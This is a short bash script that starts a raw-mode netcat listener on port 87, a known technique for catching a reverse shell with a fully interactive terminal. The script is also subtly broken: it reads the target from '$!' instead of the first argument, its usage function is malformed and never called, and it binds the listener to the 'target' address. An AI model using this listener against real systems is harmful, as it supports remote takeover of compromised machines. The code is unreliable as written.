#!/bin/bash
function usage {
echo "usage"
"$0 TARGETIP"
exit 1
}

TARGETIP="$!"
stty raw -echo; (stty size; cat) |nc -lvnp 87 -s "$TARGETIP"
